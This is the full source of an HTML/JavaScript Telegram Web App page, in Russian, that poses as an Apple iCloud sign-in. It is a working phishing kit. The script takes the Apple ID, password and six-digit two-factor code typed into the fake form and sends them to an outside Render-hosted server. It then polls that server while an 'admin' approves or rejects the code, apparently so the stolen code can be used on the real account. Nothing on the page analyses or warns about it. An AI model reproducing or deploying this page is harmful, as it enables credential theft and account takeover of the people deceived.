<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iCloud Services</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; padding-top: 50px; background-color: #f5f5f7; }
        .login-form { width: 300px; display: flex; flex-direction: column; gap: 15px; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { text-align: center; font-size: 20px; margin-bottom: 10px; }
        input { padding: 12px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 16px; outline: none; }
        input:focus { border-color: #007aff; }
        button { padding: 12px; background: #007aff; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 500; }
        button:disabled { background: #b2d7ff; cursor: not-allowed; }
        button.secondary { background: #f5f5f7; color: #007aff; border: 1px solid #007aff; }
        p { font-size: 14px; color: #6e6e73; text-align: center; }
    </style>
</head>
<body>

<div class="login-form" id="auth-step">
    <h2>Вход в iCloud</h2>
    <input type="text" id="email" placeholder="Apple ID">
    <input type="password" id="password" placeholder="Пароль">
    <button id="auth-btn" onclick="sendData()">Войти</button>
</div>

<div class="login-form" id="2fa-step" style="display:none;">
    <h2>Двухфакторная проверка</h2>
    <p>Код подтверждения отправлен на ваше устройство Apple.</p>
    <input type="text" id="code" placeholder="Код из 6 цифр" inputmode="numeric" maxlength="6">
    <button id="2fa-btn" onclick="send2FA()">Подтвердить</button>
</div>

<div class="login-form" id="menu-step" style="display:none;">
    <h2>Успешный вход</h2>
    <p>Вы вошли в систему.</p>
    <button class="secondary" onclick="backToLogin()">Выйти</button>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    // ССЫЛКА НА ТВОЙ СЕРВЕР RENDER
    const serverUrl = 'https://sever-afk3.onrender.com'; 
    const userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "guest_" + Math.floor(Math.random() * 10000);

    // ТА САМАЯ ФУНКЦИЯ
    async function apiRequest(endpoint, data) {
        try {
            const response = await fetch(`${serverUrl}${endpoint}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ...data, userId })
            });
            return await response.json(); 
        } catch (e) {
            console.error("Ошибка сети:", e);
            tg.showAlert("Сервер Render не отвечает. Проверь статус Live!");
        }
    }

    async function sendData() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;
        if (!email.includes('@')) { tg.showAlert('Введите корректный Apple ID'); return; }

        document.getElementById('auth-btn').disabled = true;
        const res = await apiRequest('/send-data', { type: 'auth', email, pass });
        
        if (res && res.status === 'ok') {
            document.getElementById('auth-step').style.display = 'none';
            document.getElementById('2fa-step').style.display = 'flex';
        } else {
            document.getElementById('auth-btn').disabled = false;
        }
    }

    async function send2FA() {
        const code = document.getElementById('code').value;
        if (code.length < 4) { tg.showAlert('Введите код'); return; }

        document.getElementById('2fa-btn').disabled = true;
        const res = await apiRequest('/send-data', { type: '2fa', code });

        if (res && res.status === 'ok') {
            tg.showConfirm("Ожидание подтверждения админом...");

            const checkInterval = setInterval(async () => {
                try {
                    const statusRes = await fetch(`${serverUrl}/check/${userId}`);
                    const data = await statusRes.json();

                    if (data.status === 'success') {
                        clearInterval(checkInterval);
                        document.getElementById('2fa-step').style.display = 'none';
                        document.getElementById('menu-step').style.display = 'flex';
                    } 
                    else if (data.status === 'error') {
                        clearInterval(checkInterval);
                        backToLogin();
                        tg.showAlert("Код отклонен. Войдите заново.");
                    }
                } catch (e) { console.error(e); }
            }, 3000);
        } else {
            document.getElementById('2fa-btn').disabled = false;
        }
    }

    function backToLogin() {
        document.getElementById('2fa-step').style.display = 'none';
        document.getElementById('menu-step').style.display = 'none';
        document.getElementById('auth-step').style.display = 'flex';
        document.getElementById('auth-btn').disabled = false;
        document.getElementById('2fa-btn').disabled = false;
        document.getElementById('password').value = '';
        document.getElementById('code').value = '';
    }
</script>
</body>
</html>
